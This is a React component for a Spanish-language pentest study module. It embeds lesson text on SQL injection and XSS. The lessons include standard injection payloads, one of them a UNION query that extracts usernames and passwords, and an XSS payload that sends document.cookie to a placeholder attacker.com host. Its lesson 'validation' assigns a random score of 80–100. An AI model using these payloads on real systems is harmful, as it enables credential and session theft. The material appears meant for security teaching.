
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Textarea } from "@/components/ui/textarea";
import { ArrowLeft, Play, CheckCircle, Terminal, BookOpen } from "lucide-react";
import { ScriptExecutor } from "./ScriptExecutor";

interface LessonMetadata {
  id: string;
  title: string;
  description: string;
  category: string;
  difficulty: "beginner" | "intermediate" | "advanced";
  estimated_time: string;
  prerequisites: string[];
  tags: string[];
  author: string;
  script: string;
  points: number;
}

interface StudyProgress {
  status: "new" | "in_progress" | "completed";
  score?: number;
  completedAt?: string;
}

interface StudyLessonProps {
  lesson: LessonMetadata;
  progress?: StudyProgress;
  onBack: () => void;
  onComplete: (score: number) => void;
}

export const StudyLesson = ({ lesson, progress, onBack, onComplete }: StudyLessonProps) => {
  const [currentStep, setCurrentStep] = useState<"lesson" | "practice" | "validation">("lesson");
  const [lessonContent, setLessonContent] = useState<string>("");
  const [userAnswer, setUserAnswer] = useState("");
  const [scriptExecuted, setScriptExecuted] = useState(false);
  const [showScript, setShowScript] = useState(false);

  useEffect(() => {
    // Simular carga del contenido de la lección
    const loadLessonContent = async () => {
      // En una implementación real, esto cargaría el archivo .md desde el sistema
      const mockContent = getLessonContent(lesson.id);
      setLessonContent(mockContent);
    };
    
    loadLessonContent();
  }, [lesson.id]);

  const getLessonContent = (lessonId: string): string => {
    const contents: { [key: string]: string } = {
      sql_injection: `# SQL Injection - Fundamentos y Práctica

## 🎯 Objetivo de la Lección
Aprender a identificar, explotar y prevenir vulnerabilidades de inyección SQL en aplicaciones web.

## 📚 Conceptos Clave

### ¿Qué es SQL Injection?
La inyección SQL es una vulnerabilidad que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos.

### Tipos de SQL Injection
1. **In-band SQLi** - Error-based y Union-based
2. **Blind SQLi** - Boolean-based y Time-based  
3. **Out-of-band SQLi** - DNS y HTTP requests

## 🛠️ Práctica con BOFA

### Paso 1: Reconocimiento
\`\`\`sql
' OR 1=1-- 
" OR 1=1-- 
admin'--
' UNION SELECT NULL,NULL--
\`\`\`

### Paso 2: Enumeración
\`\`\`sql
' UNION SELECT version(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
\`\`\`

### Paso 3: Explotación
\`\`\`sql
' UNION SELECT username,password FROM users--
\`\`\`

## ✅ Validación
- ¿Pudiste extraer información de la base de datos?
- ¿Entiendes la diferencia entre Union-based y Blind SQLi?
- ¿Sabes cómo prevenir estas vulnerabilidades?

## 🛡️ Prevención
- Usar prepared statements
- Validar y sanitizar inputs
- Implementar WAF
- Principio de menor privilegio en DB`,

      xss: `# Cross-Site Scripting (XSS) - Fundamentos

## 🎯 Objetivo
Comprender y practicar la identificación y explotación de vulnerabilidades XSS.

## 📚 Tipos de XSS

### 1. Reflected XSS
\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
\`\`\`

### 2. Stored XSS
\`\`\`html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
\`\`\`

### 3. DOM-based XSS
\`\`\`javascript
document.getElementById('output').innerHTML = location.hash.substring(1);
\`\`\`

## 🧪 Práctica
1. Ejecuta \`xss_trainer.py\`
2. Prueba diferentes payloads
3. Analiza el contexto de inyección
4. Practica bypass de filtros

## 🛡️ Prevención
- Escapar outputs
- Content Security Policy (CSP)
- Validación de inputs
- HTTPOnly cookies`
    };

    return contents[lessonId] || "# Contenido de la lección\n\nEsta lección está en desarrollo...";
  };

  const handleValidation = () => {
    if (!scriptExecuted) {
      alert("Primero debes ejecutar el script de práctica!");
      return;
    }

    if (userAnswer.trim().length < 50) {
      alert("Por favor, proporciona una respuesta más detallada sobre lo que aprendiste.");
      return;
    }

    // Simular validación y puntuación
    const score = Math.floor(Math.random() * 20) + 80; // Score entre 80-100
    onComplete(score);
  };

  const mockScript = {
    name: lesson.script,
    description: `Script de práctica para ${lesson.title}`,
    category: lesson.category,
    author: lesson.author,
    version: "1.0",
    last_updated: "2025-01-15"
  };

  if (showScript) {
    return (
      <ScriptExecutor 
        module={lesson.category}
        script={mockScript}
        onBack={() => setShowScript(false)}
        onExecutionComplete={() => setScriptExecuted(true)}
      />
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white p-6">
      <div className="container mx-auto max-w-4xl">
        {/* Header */}
        <div className="mb-6">
          <Button 
            variant="outline" 
            onClick={onBack}
            className="border-gray-600 text-gray-300 hover:bg-gray-700 mb-4"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Volver al Modo Estudio
          </Button>
          
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-cyan-400 mb-2">{lesson.title}</h1>
              <p className="text-gray-300">{lesson.description}</p>
            </div>
            <div className="text-right">
              <Badge className="bg-cyan-600 text-white mb-2">
                🏆 {lesson.points} puntos
              </Badge>
              <p className="text-sm text-gray-400">⏱️ {lesson.estimated_time}</p>
            </div>
          </div>
        </div>

        {/* Progress Steps */}
        <div className="mb-8">
          <div className="flex items-center space-x-4">
            <div className={`flex items-center space-x-2 px-4 py-2 rounded-lg ${
              currentStep === "lesson" ? "bg-cyan-600" : "bg-gray-700"
            }`}>
              <BookOpen className="w-4 h-4" />
              <span>1. Lección</span>
            </div>
            <div className={`flex items-center space-x-2 px-4 py-2 rounded-lg ${
              currentStep === "practice" ? "bg-cyan-600" : "bg-gray-700"
            }`}>
              <Terminal className="w-4 h-4" />
              <span>2. Práctica</span>
            </div>
            <div className={`flex items-center space-x-2 px-4 py-2 rounded-lg ${
              currentStep === "validation" ? "bg-cyan-600" : "bg-gray-700"
            }`}>
              <CheckCircle className="w-4 h-4" />
              <span>3. Validación</span>
            </div>
          </div>
        </div>

        {/* Content */}
        {currentStep === "lesson" && (
          <Card className="bg-gray-800/50 border-gray-700 mb-6">
            <CardHeader>
              <CardTitle className="text-cyan-400">📚 Contenido de la Lección</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="prose prose-invert max-w-none">
                <pre className="whitespace-pre-wrap text-gray-300 font-sans">
                  {lessonContent}
                </pre>
              </div>
              <div className="mt-6">
                <Button 
                  onClick={() => setCurrentStep("practice")}
                  className="bg-cyan-600 hover:bg-cyan-700"
                >
                  Continuar a la Práctica
                  <Play className="w-4 h-4 ml-2" />
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {currentStep === "practice" && (
          <Card className="bg-gray-800/50 border-gray-700 mb-6">
            <CardHeader>
              <CardTitle className="text-cyan-400">🧪 Laboratorio de Práctica</CardTitle>
              <CardDescription className="text-gray-300">
                Ejecuta el script de práctica para aplicar los conocimientos aprendidos
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div className="bg-gray-900 p-4 rounded-lg">
                  <h4 className="text-yellow-400 font-semibold mb-2">📄 Script: {lesson.script}</h4>
                  <p className="text-gray-300 text-sm mb-4">
                    Este script te permitirá practicar los conceptos aprendidos en un entorno controlado
                  </p>
                  <Button 
                    onClick={() => setShowScript(true)}
                    className="bg-green-600 hover:bg-green-700"
                  >
                    <Terminal className="w-4 h-4 mr-2" />
                    Ejecutar Script de Práctica
                  </Button>
                  {scriptExecuted && (
                    <div className="mt-2 text-green-400 text-sm flex items-center">
                      <CheckCircle className="w-4 h-4 mr-1" />
                      Script ejecutado correctamente
                    </div>
                  )}
                </div>
                
                <div className="flex space-x-4">
                  <Button 
                    variant="outline"
                    onClick={() => setCurrentStep("lesson")}
                    className="border-gray-600 text-gray-300"
                  >
                    ← Volver a Lección
                  </Button>
                  <Button 
                    onClick={() => setCurrentStep("validation")}
                    disabled={!scriptExecuted}
                    className="bg-cyan-600 hover:bg-cyan-700 disabled:opacity-50"
                  >
                    Continuar a Validación →
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        {currentStep === "validation" && (
          <Card className="bg-gray-800/50 border-gray-700 mb-6">
            <CardHeader>
              <CardTitle className="text-cyan-400">✅ Validación de Conocimientos</CardTitle>
              <CardDescription className="text-gray-300">
                Demuestra que has comprendido los conceptos de la lección
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Describe lo que has aprendido y cómo aplicarías estos conocimientos en un pentest real:
                  </label>
                  <Textarea 
                    value={userAnswer}
                    onChange={(e) => setUserAnswer(e.target.value)}
                    placeholder="Explica los conceptos aprendidos, las técnicas practicadas y cómo las usarías profesionalmente..."
                    className="bg-gray-900 border-gray-600 text-white"
                    rows={6}
                  />
                </div>
                
                <div className="flex space-x-4">
                  <Button 
                    variant="outline"
                    onClick={() => setCurrentStep("practice")}
                    className="border-gray-600 text-gray-300"
                  >
                    ← Volver a Práctica
                  </Button>
                  <Button 
                    onClick={handleValidation}
                    className="bg-green-600 hover:bg-green-700"
                    disabled={userAnswer.trim().length < 50}
                  >
                    <CheckCircle className="w-4 h-4 mr-2" />
                    Completar Lección
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
};
